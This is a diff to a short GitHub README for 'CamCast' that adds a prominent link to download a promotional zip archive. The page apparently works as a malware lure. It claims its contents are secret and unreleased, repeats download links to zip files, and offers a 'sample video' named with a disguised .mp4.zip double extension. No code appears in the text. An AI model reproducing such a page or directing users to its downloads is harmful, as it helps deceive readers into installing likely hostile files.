@@ -1,5 +1,6 @@
 # CamCast
-### :exclamation:**`Our product supports Windows XP/7/8/10`**:exclamation:    
+### :exclamation:**`Our product supports Windows XP/7/8/10`**:exclamation:  
+### [**DOWNLOAD OUR PRODUCT AND DEMO VIDEOS**](https://github.com/CamCast-O-Matic/Promotion/files/6279906/CamCastPromo.zip)
 We want to warn you that the data in this letter is secret because the official version of the product has not yet been released.  
 **LINK TO DOWNLOAD ALL INFORMATION FOR PROMOTION** - [**CamCastPromo**](https://github.com/CamCast-O-Matic/Promotion/files/6279906/CamCastPromo.zip)  ![https://img.shields.io/jenkins/plugin/i/view-job-filters](https://img.shields.io/jenkins/plugin/i/view-job-filters) ![https://img.shields.io/badge/Realese-No-red](https://img.shields.io/badge/Realese-No-red)    
 #### :exclamation: **LINK TO DOWNLOAD SAMPLE VIDEO** :exclamation: - [**camcast_promo_preroll_video_example_promotion.mp4**](https://github.com/CamCast-O-Matic/Promotion/files/6279900/camcast_promo_preroll_video_example_promotion.mp4.zip)  
